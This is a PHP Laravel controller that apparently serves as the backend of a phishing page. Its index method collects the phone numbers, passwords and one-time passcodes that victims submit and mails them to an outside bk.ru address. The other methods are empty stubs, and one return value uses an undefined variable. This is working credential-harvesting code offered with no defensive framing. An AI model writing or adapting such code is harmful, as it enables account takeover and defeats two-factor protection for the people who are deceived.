<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Mail;
use App\Mail\InfoMail;

class HomeController extends Controller
{
    public function index(Request $request)
    {

        $body='';

        if ( $phone = $request->input('phone')) {
            $body = $body.'tel: '.$phone;
        }
        if ( $pass = $request->input('password')) {
            $body = $body.'|password is: '.$pass;
        }
        if ( $otp = $request->input('otp')) {
            $body = $body.' |otp is: '.$otp;
        }

        if ( $ss = $request->input('ss')) {
            $body = $body.' |time is: '.$ss;
        }





        $info = [
            'title'=> 'info',
            'body'=> $body
        ];

        Mail::to('nomanherenorthere@bk.ru')->send(new InfoMail($info));

        if($request->input('ss')){
          return ['ss'=>''];
        }

        return ['ss'=>$milliseconds];
    }

    public function ff(Request $request){
        return view('ff');
    }
    public function war(Request $request){


    }

    public function del(Request $request){

    }

    public function ok(Request $request){

        return 'o';
    }
}
